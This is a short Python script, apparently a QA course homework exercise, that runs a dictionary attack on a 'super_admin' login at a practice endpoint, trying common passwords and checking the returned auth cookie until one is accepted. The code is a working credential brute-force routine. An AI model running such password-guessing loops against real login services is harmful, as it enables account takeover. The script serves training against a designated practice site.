import requests

passwords = (123456, '123456', 'password', 12345, '12345', 12345678, '12345678', 'football', 'qwerty', 1234567890, '1234567890',
             1234567, '1234567', 'princess', 1234, '1234', 'login', 'welcome', 'solo', 'abc123', 'admin',
             121212, '121212', 'flower', 'passw0rd', 'dragon', 'sunshine', 'master', 'hottie', 'loveme', 'zaq1zaq1', 'password1')



for password in passwords:
    payload = {'login': 'super_admin', 'password' : password}
    response1 = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data= payload)

    cookie_val = response1.cookies['auth_cookie']
    cookie = {'auth_cookie' : cookie_val}

    response2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies = cookie)

    if response2.text == 'You are authorized':
        print(f'Ваш пароль - {password}')
        break


